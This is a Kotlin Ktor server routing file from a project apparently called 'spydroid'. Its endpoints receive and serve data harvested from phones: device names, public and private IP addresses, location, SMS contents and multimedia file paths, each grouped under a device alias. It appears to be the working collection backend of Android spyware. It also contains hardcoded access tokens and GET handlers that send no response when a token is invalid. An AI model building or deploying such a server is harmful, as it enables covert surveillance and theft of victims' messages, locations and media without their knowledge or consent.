/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.http.HttpStatusCode
import io.ktor.server.application.*
import io.ktor.server.request.receiveParameters
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import net.spydroid.server.models.DeviceHandler
import net.spydroid.server.models.InfoHandler
import net.spydroid.server.models.MultimediaHandler
import net.spydroid.server.models.SmsHandler
import org.koin.ktor.ext.inject


// Main Routes
private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

// Global Params
private object PARAMS {
    const val ACCESS_TOKEN = "access_token"
    const val ALIAS = "alias"
    val SEARCH = "search"
    val ALL = "ALL"
}

private object BAD_REQUESTS_RESPONSES {
    // If access token does not exist
    const val ACCESS_TOKEN = "Missing access token"

    // If alias does not exist
    const val ALIAS = "Missing alias"

    // If access token is not in list from valid tokens
    const val INVALID_ACCESS_TOKEN = "Invalid access token"
}

private const val SUCCESSFULL_POST = "Successfully uploaded data"

fun Application.configureRouting() {
    val validTokens = setOf("iygad7618wg8y1f7fgvas71f671", "otroTokenValido")

    routing {
        devices(validTokens)
        info(validTokens)
        sms(validTokens)
        multimedia(validTokens)
    }
}

private fun Route.devices(validTokens: Set<String>) {

    val devicesRepository: DevicesRepository by inject()

    get(Routes.DEVICES) {

        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL

        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val devices = devicesRepository.filerWithAlias(searchParam)
                call.respond(devices)
            } else {
                val devices = devicesRepository.getALlDevices()
                call.respond(devices)
            }
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }

    post(Routes.DEVICES) {
        val params = call.receiveParameters()

        val DEVICES_PARAMS = object {
            val NAME = "name"
        }

        val DEVICES_MESSAGES = object {
            val NAME = "Missing Name"
        }

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val name = params[DEVICES_PARAMS.NAME] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            DEVICES_MESSAGES.NAME
        )
        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                devicesRepository.insert(
                    DeviceHandler(
                        alias = alias,
                        name = name
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}


private fun Route.info(validTokens: Set<String>) {

    val infoRepository: InfoRepository by inject()

    get(Routes.INFO) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL

        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val info = infoRepository.filerWithAlias(searchParam)
                call.respond(info)
            } else {
                val info = infoRepository.getAllInfo()
                call.respond(info)
            }
        }
    }

    post(Routes.INFO) {
        val params = call.receiveParameters()

        val INFO_PARAMAS = object {
            val IP_PUBLIC = "ip_public"
            val IP_PRIVATE = "ip_private"
            val LOCATION = "location"
        }

        val INFO_MESSAGES = object {
            val IP_PUBLIC = "Missing Public Ip Address "
            val IP_PRIVATE = "Missing Private Ip Address"
            val LOCATION = "Missing Location"
        }

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PUBLIC
        )

        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PRIVATE
        )

        val location = params[INFO_PARAMAS.LOCATION] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.LOCATION
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                infoRepository.insert(
                    InfoHandler(
                        alias = alias,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}

private fun Route.sms(validTokens: Set<String>) {

    val smsRepository: SmsRepository by inject()

    get(Routes.SMS) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL
        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val sms = smsRepository.filerWithAlias(searchParam)
                call.respond(sms)
            } else {
                val sms = smsRepository.getALlSms()
                call.respond(sms)
            }
        }
    }

    post(Routes.SMS) {
        val params = call.receiveParameters()

        val SMS_PARAMS = object {
            val SMS = "sms"
        }

        val SMS_MESSAGES = object {
            val SMS = "Missing Sms"
        }

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val sms = params[SMS_PARAMS.SMS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            SMS_MESSAGES.SMS
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                smsRepository.insert(
                    SmsHandler(
                        alias = alias,
                        sms = sms
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}

private fun Route.multimedia(validTokens: Set<String>) {

    val multimediaRepository: MultimediaRepository by inject()

    get(Routes.MULTIMEDIA) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL
        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val multimedia = multimediaRepository.filerWithAlias(searchParam)
                call.respond(multimedia)
            } else {
                val multimedia = multimediaRepository.getAllMultimedia()
                call.respond(multimedia)
            }
        }
    }

    post(Routes.MULTIMEDIA) {
        val params = call.receiveParameters()

        val MULTI_PARAMS = object {
            val ROUTE_FILE = "route_file"
            val TYPE = "type"
        }

        val MULTI_MESSAGES = object {
            val ROUTE_FILE = "Missing route file"
            val TYPE = "Missing type file"
        }

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val routeFile = params[MULTI_PARAMS.ROUTE_FILE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.ROUTE_FILE
        )

        val type = params[MULTI_PARAMS.TYPE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.TYPE
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                multimediaRepository.insert(
                    MultimediaHandler(
                        alias = alias,
                        routeFile = routeFile,
                        type = type
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}
